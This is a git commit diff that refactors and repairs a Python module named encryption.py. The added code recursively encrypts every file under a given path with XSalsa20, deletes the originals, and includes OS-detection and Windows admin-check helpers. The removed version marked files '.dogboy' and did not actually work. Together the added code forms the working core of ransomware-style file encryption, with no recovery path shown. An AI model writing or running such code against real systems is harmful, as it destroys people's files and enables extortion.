cda3fed3edebd703ab9ffbb1025e14f9fd7ed6b7
John <147680168+CyberDefenseEd@users.noreply.github.com>
2024-05-22 13:22:53 -0400

    Update encryption.py

--- mods/encryption.py
+++ mods/encryption.py
@@ -1,42 +1,58 @@
+import os
+import ctypes
+from platform import system
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 from cryptography.hazmat.primitives.ciphers import algorithms, modes, Cipher
-from platform import *
-import os,ctypes
-class encryption_:
+
+class Encryption:
+    @staticmethod
     def encrypt(filepath, password, salt, args):
-        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),length=32,salt=salt,iterations=100000)
-        key = kdf.derive(password)
+        key = Encryption._derive_key(password, salt)
         for root, dirs, files in os.walk(filepath):
             for name in files:
                 filename = os.path.join(root, name)
-                encryption_.encFile(filename, key, args)
+                Encryption._encrypt_file(filename, key, args)
 
-    def encFile(filename, key, args):
-        with open(filename, "rb") as f_in:
-            with open(filename + ".dogboy", "wb") as f_out:
-                encryptor = Cipher(algorithms.XSalsa20,key,modes.OpenSSLRaw(b"nonce")).encryptor()
-                encryptor.update(f_in.read())
-                f_out.write(encryptor.finalize())
-                if not args.quiet:
-                    print(f"Encrypted: {filename}")
+    @staticmethod
+    def _derive_key(password, salt):
+        kdf = PBKDF2HMAC(
+            algorithm=hashes.SHA256(),
+            length=32,
+            salt=salt,
+            iterations=100000
+        )
+        return kdf.derive(password)
+
+    @staticmethod
+    def _encrypt_file(filename, key, args):
+        with open(filename, "rb") as f_in, open(filename + ".enc", "wb") as f_out:
+            nonce = os.urandom(24)  # XSalsa20 uses a 24-byte nonce
+            cipher = Cipher(algorithms.XSalsa20(key, nonce), mode=None).encryptor()
+            f_out.write(nonce)  # Save nonce to the beginning of the file
+            f_out.write(cipher.update(f_in.read()) + cipher.finalize())
+        
+        if not args.quiet:
+            print(f"Encrypted: {filename}")
+        
         os.remove(filename)
 
-    def getsys():
-        sys_ = ""
-        match system():
-            case "Windows":
-                sys_ = "win"
-            case "Linux":
-                sys_ = "lin"
-            case "Darwin":
-                sys_ = "mac"
-            case _:
-                sys_ = "invalid"
-        return sys_
+    @staticmethod
+    def get_system():
+        systems = {
+            "Windows": "win",
+            "Linux": "lin",
+            "Darwin": "mac"
+        }
+        return systems.get(system(), "invalid")
 
-    def isAdmin():
+    @staticmethod
+    def is_admin():
         try:
             return ctypes.windll.shell32.IsUserAnAdmin()
-        except:
+        except AttributeError:
             return False
+
+# Example usage:
+# Encryption.encrypt('/path/to/files', b'mypassword', b'mysalt', args)
+# Note: Ensure `args` has a `quiet` attribute (e.g., args.quiet) as expected by the methods.
